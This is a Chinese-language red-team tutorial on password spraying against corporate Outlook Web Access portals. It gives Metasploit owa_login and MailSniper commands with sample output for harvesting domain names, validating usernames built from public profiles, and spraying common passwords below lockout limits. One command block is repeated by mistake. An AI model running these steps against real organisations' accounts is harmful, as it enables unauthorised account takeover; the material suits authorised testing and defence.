## Password spraying
下文译作密码碰撞
###常见手法
密码碰撞是一种使用使用有效的用户名和弱口令进行排列组合尝试登录的技术，目的是获得有效的身份凭证。
这种技术在从某种程度上来说并不可靠的，一不小心执行就会导致自己处于暴露的边缘。在碰撞之前，我们应该应该摸清楚目标的各个规则，如错误锁定时间次数等，以一种可控的方式尝试密码碰撞，并跨多个用户以避免锁定。也就是说密码碰撞实际上就属于暴力破解。
这项技术的使用是有前提的。不管它是在外网还是在内网执行，道理都是一样的。绝大部分需要的注意的东西都可以轻松试出了。
###前提准备
* 可碰撞的服务
* 域名/ip
* 用户名或邮箱
###常用工具
* [DomainPasswordSpray​](https://github.com/dafthack/DomainPasswordSpray)
* [MailSniper​](https://github.com/dafthack/MailSniper)
* [auxiliary/scanner/http/owa_login​](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login)
* [auxiliary/scanner/http/owa_ews_login​](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login)
-------
###外网
现如今绝大部分企业都为自己的员工提供了企业邮箱，所以当我们在外网发起的攻击时就可以把这作为一个攻击入口。下面以OutLook(下面简称OWA)）为例说明:
如图，如果我们可以尝试用普通密码验证时找到其规律。我们就可以尝试使用公共密码进行身份验证。但是要注意在碰撞的时候不要超过登录失败后账户锁定的阈值。很多企业门户在连续尝试五到十次之后就账户就会被锁定了，有些甚至只有三次机会。锁定的时间通常为30分钟。在碰撞时一定要谨慎，具体情况得具体分析。
**第一步：寻找可碰撞的服务**
OWA门户通常会出现在`mail.testlab.local` ,`testlab.local/owa`。任何ADFS集成门户在理论上都可以碰撞，因为它们的后台都是一样的AD身份验证。需要注意有些工具(如MailSniper)是针对攻击邮件门户而开发的，因此如果不是OWA门户，那么工具的部分功能并没有什么用。子域枚举工具对寻找此类门户的地址非常有用。还有一种思路是扫web目录，如testlab.local/RDweb这样的。
**第二步：获取域名**
Metasploit的owa—login模块不仅可以用于暴力破解,还可以用来寻找有漏洞的域。对用户名进行碰撞或许能够帮助你寻找到一个有效的用户名。Metasploit使用NTLM响应来识别域名。有些管理员会把域名做成logo一类的放到OWA的页面上,碰上就是再好不过的了。
```
use auxiliary/scanner/http/owa_login
set rhost 
set username 
set password 
exploit
​
[+] Found target domain: TESTLAB
```
除此之外，也可以让MailSniper根据响应时间来获取域名。
```
Invoke-DomainHarvestOWA -ExchHostname testlab.local -DomainList c:\temp\domainlist.txt -OutFile potential-domains.txt
​
[*] Harvesting Domain Name from the OWA portal at https://testlab.local/owa/
...
[*] Potentially Valid Domain! Domain:TESTLAB
```
**第三步：获取有效的用户名或者邮箱**
前面我们已经获取到了域名, 现在我们可以尝试一下枚举用户名。如果我们没找到相关用户名或邮箱,那就需要想办法获取到,比如社工库,Google,baidu,Linkedin,钟馗之眼等等。此外我们也可以尝试一下直接暴力枚举用户名,当时成功的几率通常很小。
假设这种情况,我们在Linkedin上获取到一个邮箱账号并不为奇,那么可以顺便检查一下**theHarvester**.如果他的名字是`Bill Long Money`,那么他的邮箱就很可能是`PI:EMAIL`。同理如果你在百度贴吧搜索到一个QQ号,那么他的邮箱就是`PI:EMAIL` 。
域用户名的设置通常有很多可能的规律，假设名字是:`Bill Long Money`那么用户名可能是：
* 名字的首字母+姓氏= bmoney
* 名字的字母缩写和姓氏(也可以包括中间名)= bm或blm
* 前缀(通常是字符)+名首字母+姓氏= a-bmoney
* 全名= billmoney(比较少见)
我们可以通过对不同的信息进行排列组合形成一个用户名字典。`owa_login`可以验证出用户名是否有效。比如我们试一下`bmoney`这个用户名。
```
use auxiliary/scanner/http/owa_login
set rhost 10.10.10.10
set domain TESTLAB
set username bmoney
set password ilovemoney
exploit
​
[*] 10.10.10.10:443 OWA - Trying bmoney : ilovemoney
[+] server type: MX01
[*] 10.10.10.10:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.224583728 'TESTLAB\bmoney' : 'ilovemoney': SAVING TO CREDS
[*] Auxiliary module execution completed
```
如同提示`FAILED LOGIN, BUT USERNAME IS VALID`所说，虽让登录失败了，但是用户名是存在的嘛。
同样我们也可以使用Mailsniper进行类似的操作。
```
Invoke-UsernameHarvestOWA -ExchHostname testlab.corp.local -UserList c:\temp\userlist.txt -Domain TESTLAB -OutFile potential-usernames.txt
​
[*] Now spraying the OWA portal at https://testlab.local/owa/
...
[*] Potentially Valid! User:TESTLAB\bmoney
```
**第四步：开始碰撞**
现在有效的域和用户名都有了，我门就可以开始进行碰撞了。如前面所提醒的一样，为了防止账户被锁定。那些用户名碰撞过，确切时间，尝试了哪些密码，以及每个用户尝试了多少次等都很重要，我们需要控制好线程。
```
use auxiliary/scanner/http/owa_login
set rhost 10.10.10.10
set domain TESTLAB
set username bmoney
set password ilovemoney
exploit
​
[*] 10.10.10.10:443 OWA - Trying bmoney : ilovemoney
[+] server type: MX01
[*] 10.10.10.10:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.224583728 'TESTLAB\bmoney' : 'ilovemoney': SAVING TO CREDS
[*] Auxiliary module execution completed
```
同理也可以使用Mailsniper进行该的操作，用户名我们放在`userlist.txt`文件里。
```
Invoke-PasswordSprayOWA -ExchHostname testlab.local -userlist .\userlist.txt -password winter2018
​
[*] Now spraying the OWA portal at https://testlab.local/owa/
​
[*] SUCCESS! User:bmoney:winter2018
```
很奈斯，碰撞到了有效的密码。
-------
###内网
碰撞不仅仅是您可以在外部找到域用户的事。如果您有内部访问权限，但不知道域用户，或者在没有其他操作权限时获得更高权限的用户的凭据，这可能非常有用。
再会！